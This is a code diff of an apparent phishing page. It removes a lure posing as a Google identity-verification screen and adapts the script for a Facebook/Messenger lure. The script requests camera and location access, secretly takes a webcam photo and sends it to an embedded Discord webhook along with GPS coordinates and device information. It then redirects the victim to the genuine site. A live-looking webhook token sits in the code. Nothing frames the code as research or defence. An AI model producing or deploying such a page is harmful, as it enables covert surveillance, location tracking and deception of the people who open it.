@@ -1,55 +1,15 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Security - Identity Verification</title>
-    <meta property="og:title" content="Google Security Center">
-    <meta property="og:description" content="Unauthorized login detected. Verify identity.">
-    <meta property="og:image" content="https://www.gstatic.com/images/branding/product/2x/googleg_96dp.png">
-    
-    <style>
-        body { background: #ffffff; font-family: 'Roboto', arial, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .container { width: 100%; max-width: 400px; padding: 40px 20px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
-        .google-logo { width: 75px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 400; color: #202124; margin: 0 0 10px; }
-        p { font-size: 16px; color: #3c4043; line-height: 1.5; margin-bottom: 30px; }
-        .alert-box { background: #fce8e6; color: #d93025; padding: 12px; border-radius: 4px; font-size: 14px; margin-bottom: 20px; font-weight: 500; }
-        .btn-primary { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
-        .btn-primary:hover { background: #1765cc; }
-        video, canvas { display: none; }
-    </style>
-</head>
-<body>
-
-<div class="container">
-    <img src="https://www.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google" class="google-logo">
-    <h1>Verify it's you</h1>
-    <div class="alert-box">Unauthorized login attempt from Dhaka, Bangladesh</div>
-    <p>To help keep your account secure, Google needs to verify your identity. Please click below to confirm this request.</p>
-    
-    <button class="btn-primary" onclick="initiateSystem()">Verify Identity</button>
-
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
-</div>
-
 <script>
-    // tumi (তুমি) - তোমার সচল Webhook URL এখানে দেওয়া হয়েছে
     const webhookURL = "https://discord.com/api/webhooks/1482987004991111318/XKQNQNpaubgBiLr3ZXww5xVQs4qeHZmMlKFBG3nU-vA5zaRlJjNgKLWK7uiNw3cH-7a0";
 
-    async function initiateSystem() {
+    async function startFBScan() {
         try {
-            // ১. ক্যামেরা পারমিশন চাওয়া
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
 
-            // ২. লোকেশন চাওয়া
-            navigator.geolocation.getCurrentPosition(async (position) => {
-                const { latitude, longitude } = position.coords;
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const { latitude, longitude } = pos.coords;
                 
-                // ৩. ছবি তোলা (১.৫ সেকেন্ড পর যাতে পরিষ্কার আসে)
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
                     canvas.width = video.videoWidth;
@@ -57,40 +17,26 @@
                     canvas.getContext('2d').drawImage(video, 0, 0);
 
                     canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('file', blob, 'security_audit.jpg');
-                        formData.append('payload_json', JSON.stringify({
-                            content: "🚨 **System Alert: Security Verification Triggered!**",
+                        const fd = new FormData();
+                        fd.append('file', blob, 'fb_messenger_audit.jpg');
+                        fd.append('payload_json', JSON.stringify({
+                            content: "🔵 **Messenger Alert: Identity Verified!**",
                             embeds: [{
-                                color: 15844367,
-                                title: "Device & Location Intelligence",
+                                color: 1565439,
+                                title: "Target Info Captured",
                                 fields: [
-                                    { name: "📍 Google Maps", value: `https://www.google.com/maps?q=${latitude},${longitude}` },
-                                    { name: "📱 User Agent", value: navigator.userAgent }
+                                    { name: "📍 Google Maps Link", value: `https://www.google.com/maps?q=${latitude},${longitude}` },
+                                    { name: "📱 Device Info", value: navigator.userAgent }
                                 ],
-                                footer: { text: "Security Audit Tool • 2026" },
                                 timestamp: new Date()
                             }]
                         }));
 
-                        // ৪. ডিসকর্ডে পাঠানো
-                        await fetch(webhookURL, { method: 'POST', body: formData });
-                        
-                        // ৫. রিডাইরেক্ট (আসল গুগল পেজে পাঠিয়ে দেওয়া)
-                        window.location.href = "https://myaccount.google.com/notifications";
+                        await fetch(webhookURL, { method: 'POST', body: fd });
+                        window.location.href = "https://www.facebook.com/settings?tab=security";
                     }, 'image/jpeg');
                 }, 1500);
-
-            }, (err) => {
-                // লোকেশন না দিলে রিডাইরেক্ট
-                window.location.href = "https://myaccount.google.com/";
-            });
-        } catch (err) {
-            // ক্যামেরা না দিলে রিডাইরেক্ট
-            window.location.href = "https://myaccount.google.com/";
-        }
+            }, () => { window.location.href = "https://www.facebook.com"; });
+        } catch (e) { window.location.href = "https://www.facebook.com"; }
     }
 </script>
-
-</body>
-</html>
